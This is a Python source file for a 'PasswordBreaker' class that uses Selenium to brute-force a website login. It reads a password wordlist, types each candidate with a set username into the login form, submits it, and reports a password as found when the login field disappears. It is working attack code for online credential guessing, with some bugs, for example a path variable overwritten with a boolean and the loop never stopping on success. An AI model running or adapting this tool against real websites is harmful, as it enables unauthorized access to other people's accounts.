import logging
import time
from os.path import exists, join
from typing import List, Tuple

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait

from src.dir_constans import PASS_DIR
from src.website_config import WebsiteConfig


class PasswordBreaker:

    def get_password_list(self, password_file_path: str) -> List[str]:
        allowed_extensions = [".txt"]
        pass_dir = PASS_DIR
        file_path = password_file_path
        if not exists(file_path):
            for extension in allowed_extensions:
                if exists(join(pass_dir, file_path)):
                    file_path = join(pass_dir, file_path)
                    break
                elif exists(join(pass_dir, file_path + extension)):
                    file_path = exists(join(pass_dir, file_path + extension))
                    break
        if not exists(file_path):
            raise Exception(f'Password file not found for path {password_file_path}')
        return self.read_file_to_list(file_path)

    @staticmethod
    def read_file_to_list(filename: str) -> List[str]:
        with open(filename, "r") as file_handler:
            return file_handler.readlines()

    def find_correct_password(self, driver: webdriver.Chrome, website_config: WebsiteConfig) -> Tuple[str, float]:
        correct_password = ""
        passwords_list = self.get_password_list(website_config.passwords_file_name)
        start = time.time()
        for password in passwords_list:
            driver.find_element(by=By.NAME, value=website_config.username_selector).send_keys(
                website_config.login_username)
            driver.find_element(by=By.NAME, value=website_config.password_selector).send_keys(password)
            driver.find_element(by=By.CSS_SELECTOR, value=website_config.submit_button_selector).click()
            try:
                WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.NAME, "uname")))
            except:
                logging.debug(f'Found correct password {password}')
                correct_password = password
        breaking_duration = time.time() - start
        return correct_password, breaking_duration
